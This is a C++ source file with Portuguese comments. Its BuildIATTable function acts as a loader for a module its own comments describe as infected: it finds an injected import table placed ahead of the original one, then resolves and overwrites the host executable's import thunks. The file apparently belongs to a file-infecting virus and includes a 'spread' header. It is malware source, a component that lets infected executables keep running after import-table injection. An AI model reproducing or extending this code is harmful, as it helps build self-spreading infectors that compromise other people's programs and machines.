#include "..\common\spread.h"


// Faz o papel do Loader dentro do arquivo executável, ele resolve cada endereco do IAT Table
// Esta funcao considera que o modulo que esta lhe chamando é um modulo infectado
bool BuildIATTable( HANDLE hInstance ) 
{
	if ( hInstance == NULL ) 
	{
		return false;
	}

	try
	{
		PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER) hInstance;

		if ( IsBadReadPtr( pDosHeader, sizeof( IMAGE_DOS_HEADER ) ) )
		{
			return false;
		}

		if ( pDosHeader->e_magic != IMAGE_DOS_SIGNATURE )
		{
			return false;
		}

		// Recebe PE Header
		PIMAGE_NT_HEADERS pNTHeader = MakePtr( PIMAGE_NT_HEADERS, pDosHeader, pDosHeader->e_lfanew );

		if ( IsBadReadPtr( pNTHeader, sizeof( IMAGE_NT_HEADERS ) ) )
		{
			return false;
		}

		if ( pNTHeader->Signature != IMAGE_NT_SIGNATURE )
		{
			return false;
		}

		// Recebe o tamanho da tabela de importacao injetada
		int ImportTableSize = ( sizeof( IMAGE_IMPORT_DESCRIPTOR ) * 2 ) + 
							  ( sizeof( DWORD ) * 4 ) +
							  ( strlen( DEPENDENCY_NAME ) + sizeof( DWORD ) + 
							    strlen( FUNCTION_NAME ) + 1 );

		// Recebe o endereco da tabela de importacao ja inserida
		int ProtectedImportTableRVA = pNTHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ].VirtualAddress;
		
        // Agora recebe o endereco da tabela de importacao original
        int* OriginalImportTableRVA = MakePtr( int*, pDosHeader, ProtectedImportTableRVA + ImportTableSize );

		int ImageSize = pNTHeader->OptionalHeader.SizeOfImage;

		// Vai para o inicio da tabela de importacao e comeca a enumerar
		PIMAGE_IMPORT_DESCRIPTOR pImportDesc = MakePtr( PIMAGE_IMPORT_DESCRIPTOR, pDosHeader, *OriginalImportTableRVA );

		while ( pImportDesc->Name )
		{
			// Recebe o nome da dll
			char* ImportName = MakePtr( char*, pDosHeader, pImportDesc->Name );

			HMODULE ImportHandle = LoadLibrary( ImportName );

			if ( ImportHandle != NULL ) 
			{
                PIMAGE_THUNK_DATA pThunkDataOut;
                PIMAGE_THUNK_DATA pThunkDataIn;

				pThunkDataOut = (PIMAGE_THUNK_DATA) ( (DWORD) hInstance + (DWORD) pImportDesc->FirstThunk );

                if ( pImportDesc->Characteristics == 0 )
				{
                    pThunkDataIn = pThunkDataOut;
				}
				else
				{
					pThunkDataIn = (PIMAGE_THUNK_DATA) ( (DWORD) hInstance + (DWORD) pImportDesc->Characteristics );
				}

				// Processa todas as funcoes da dependencia
				while ( pThunkDataIn->u1.Function != NULL )
				{
					DWORD NewThunk;

					// Ordinal ?
                    if ( pThunkDataIn->u1.Ordinal & IMAGE_ORDINAL_FLAG )
					{
                        NewThunk = (DWORD) GetProcAddress( ImportHandle, MAKEINTRESOURCE( LOWORD( pThunkDataIn->u1.Ordinal ) ) );
					}
					else
					{
                        PIMAGE_IMPORT_BY_NAME pImportByName;
						
						pImportByName = MakePtr( PIMAGE_IMPORT_BY_NAME, pDosHeader, pThunkDataIn->u1.AddressOfData );

						if ( ! IsBadReadPtr( pImportByName, sizeof( IMAGE_IMPORT_BY_NAME ) ) )
						{
 				             // Resolve o endereco da funcao pelo nome
				             NewThunk = (DWORD) GetProcAddress( ImportHandle, (char*) pImportByName->Name );
						}
					}
					
					// Ok, agora ele modifica a tabela de importacao
					if ( NewThunk != 0 )
					{
					    DWORD dwScratch;

					    if ( VirtualProtect( &pThunkDataOut->u1.Function, sizeof( DWORD ), PAGE_READWRITE, &dwScratch ) == TRUE )
						{
						    pThunkDataOut->u1.Function = (PDWORD) NewThunk;
						}
					}
					
                    // Proxima
					pThunkDataIn++;
					pThunkDataOut++;
				}
			}
			else
			{
                return false;
			}

			pImportDesc++;
		}

		return true;

	}
	catch(...)
	{
	}

	return false;
}
